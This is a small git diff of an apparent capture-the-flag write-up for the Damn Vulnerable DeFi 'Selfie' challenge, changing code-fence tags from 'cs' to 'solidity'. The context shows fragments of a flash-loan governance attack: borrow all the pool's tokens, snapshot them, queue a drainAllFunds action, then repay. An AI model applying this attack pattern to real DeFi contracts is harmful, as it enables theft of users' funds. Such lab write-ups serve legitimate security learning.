@@ -24,7 +24,7 @@ Given that SelfiePool offers loans in exactly the same token that is required to
 
 First deploy an attacker contract which can take loans from the pool:
 
-```cs
+```solidity
 function takeLoan() public {
     // execute a flash loan borrowing all available DVT tokens in the pool
     pool.flashLoan(fundsInPool);
@@ -35,14 +35,14 @@ Where `fundsInPool` is a variable set by the constructor of the contract which o
 
 The attacker contract must contain a `receiveTokens()` function which takes a snapshot of the token balance:
 
-```cs
+```solidity
 token.snapshot();
 ```
 
 Then queues a governance action with some calldata which executes `drainAllFunds()` with the attacker address as parameter:
 
 
-```cs
+```solidity
 maliciousAction = governance.queueAction(address(pool), attackData, 0);
 ```
 
@@ -50,7 +50,7 @@ Where `attackData` is such calldata.
 
 After these two actions, the contract should return the borrowed funds back to the pool:
 
-```cs
+```solidity
 token.transfer(address(pool), amount);
 ```
 
